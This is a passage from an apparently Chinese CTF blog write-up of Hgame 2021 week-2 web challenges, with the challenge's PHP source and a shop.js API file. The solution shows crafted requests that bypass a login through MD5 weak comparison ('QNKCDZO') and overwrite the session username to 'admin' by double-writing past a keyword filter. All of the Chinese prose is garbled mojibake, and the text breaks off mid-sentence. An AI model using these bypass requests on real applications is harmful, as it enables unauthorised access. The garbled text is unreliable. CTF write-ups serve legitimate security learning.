boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">getUsersList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token class-name static-context">Config</span><span class="token operator">::</span><span class="token function">getAllUsers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span></code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œ å¯†ç æ¯”è¾ƒæ˜¯ <strong>MD5 å¼±ç±»å‹æ¯”è¾ƒ</strong>ã€‚</p><p><code>index.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string double-quoted-string">"lazy.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script&gt;alert('é£Ÿäººçš„é­”é¬¼å°è¯•ç€å‘ç­”æ¡ˆè¿›å‘ã€‚')&lt;/script&gt;"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/style.css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>box<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> white</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>æœªæˆæƒçš„çš„æ€ªç‰©æ­£åœ¨æœ¬é¡µé¢ç™»é™†<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Username<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>å°è¯•è¿›å…¥<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><p>é€»è¾‘æ˜¯ç”¨æˆ·ç™»å½•ï¼Œç„¶åè·³è½¬åˆ° <code>flag.php</code></p><p> <code>flag.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span> <span class="token string single-quoted-string">'lazy.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'æ‚¨é…å—ï¼Ÿ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/style.css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>box<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3 style='color: white'&gt;adminå°†äºä»Šæ—¥è·å–è‡ªå·±å¿ å®çš„flag&lt;/h3&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3 style='color: white'&gt;<span class="token interpolation"><span class="token variable">$flag</span></span>&lt;/h3&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$submit</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"getflag"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3 style='color: white'&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>æ¥è¿‘äº†é—®é¢˜çš„ç»ˆç‚¹&lt;/h3&gt;"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3 style='color: white'&gt;ç¯¡ä½è€…å é¢†äº†ç¥åœ£çš„é¡µé¢&lt;/h3&gt;"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token delimiter important">?&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>getflag<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span></code></pre><p>å¯ä»¥çœ‹åˆ°é¦–å…ˆè¦æœ‰ <code>$_SESSION['username']</code>ï¼Œå…¶æ¬¡è¿™é‡Œæœ‰ä¸ªè¡¨å•ï¼Œä½†ä¸å…³é”®ã€‚</p><p>å…¶å®åªéœ€è¦åœ¨è¿™é‡Œä¼ å‚æ”¹æ‰ <code>$_SESSION['username']</code> ä¸º <code>admin</code> å°±å¯äº†ã€‚</p><p>äºæ˜¯æ„é€  payloadï¼š</p><pre class="language-none"><code class="language-none">POST http://5588b617f8.lazy.r4u.top/username=testuser&amp;password=QNKCDZO</code></pre><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207174853265.png" alt="MD5å¼±ç±»å‹"></p><p>æˆåŠŸè·å¾— <code>$_SESSION['username']</code>ï¼Œè€Œåç›´æ¥ GET ä¼ å‚æ”¹æ‰è¿™ä¸ªå°±å¥½äº†ã€‚</p><p>æ³¨æ„å®ƒæœ‰ä¸ª filterï¼ŒåŒå†™ç»•è¿‡å°±å¥½äº†ï¼Œå³ <code>_SESSSESSIONION[username]=admin</code>.</p><p>ï¼ˆå®é™…ä¸Šè¿™é‡Œå¹¶ä¸éœ€è¦ç™»å½• 2333</p><pre class="language-none"><code class="language-none">GET http://5588b617f8.lazy.r4u.top/flag.php?_SESSSESSIONION%5Busername%5D=admin</code></pre><p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210207175337633.png" alt="åŒå†™ç»•è¿‡"></p><p><code>hgame{R4U~!s-4-lazy~doG}</code></p><blockquote><p><em>Extensive Reading</em></p><p><a href="https://daolgts.github.io/2018/09/05/unset-%E8%AE%B0%E4%B8%80%E9%81%93CTF%E9%A2%98/">unset_è®°ä¸€é“CTFé¢˜</a>ï¼Œé‡Œé¢è®²äº†ä¸ªæœ‰ç‚¹ç±»ä¼¼çš„ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_POST'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_GET'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_COOKIE'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$__R</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$$__R</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$$__R</span> <span class="token keyword">as</span> <span class="token variable">$__k</span> <span class="token operator">=&gt;</span> <span class="token variable">$__v</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$$__k</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$$__k</span> <span class="token operator">==</span> <span class="token variable">$__v</span><span class="token punctuation">)</span> <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$$__k</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></blockquote><h3 id="Likiçš„ç”Ÿæ—¥ç¤¼ç‰©"><a href="#Likiçš„ç”Ÿæ—¥ç¤¼ç‰©" class="headerlink" title="Likiçš„ç”Ÿæ—¥ç¤¼ç‰©"></a>Likiçš„ç”Ÿæ—¥ç¤¼ç‰©</h3><blockquote><p>Likiç”Ÿæ—¥å¿«è¦åˆ°äº†ï¼Œå¥¹æƒ³è¦ä¸€å°switchï¼Œä½ èƒ½å¸®å¸®å¥¹ä¹ˆï¼Ÿ</p><p><a href="https://birthday.liki.link/">https://birthday.liki.link</a> </p></blockquote><p><code>shop.js</code> é‡Œæœ‰ä¸€äº›æ¥å£ç›¸å…³ä»£ç </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/API/?m=login"</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>            name<span class="token operator">:</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            password<span class="token operator">:</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> status</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> message <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>message<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token string">"error"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>data<span class="token punctuation">)</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"shop.html"</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/API/?m=register"</span><span class="token punctuation">,</span>        <span class="token punctuation">{</span>            name<span class="token operator">:</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            password<span class="token operator">:</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> status</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> message <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>message<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token string">"error"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>message<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token string">"success"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"index.html"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/API/?m=getinfo"</span><span class="token punctuation">,</span>        <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> status</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> message <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>message<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token string">"error"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"index.html"</span>            <span class="token punctuation">}</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#money"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token string">'money'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#num"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">buy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/API/?m=buy"</span><span class="token punctuation">,</span>        data <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#buy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">,</span>        <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> status</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> message <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>message<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token string">"error"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>data<span class="token punctuation">)</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"å…‘æ¢æˆåŠŸ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">getinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/API/?m=logout"</span><span class="token punctuation">,</span>        <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> status</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> message <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>message<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token string">"success"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">alert</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"index.html"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    $<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/API/?m=getflag"</span><span class="token punctuation">,</span>        <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> status</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> message <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>            <span class="token function">alert</span><span class="token punctuation">(</span>message<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ç®€å•çœ‹äº†çœ‹å‘ç°æ²¡å•¥é—®é¢˜ï¼Œä¹Ÿåšäº†æ•°æ®çš„åˆæ³•æ€§æ ¡éªŒï¼Œæ¯”å¦‚å¤§æ•°æº¢å‡ºã€floatã€è´Ÿæ•°å•¥çš„åšä¸åˆ°ã€‚</p><p>äºæ˜¯è€ƒè™‘æ˜¯ 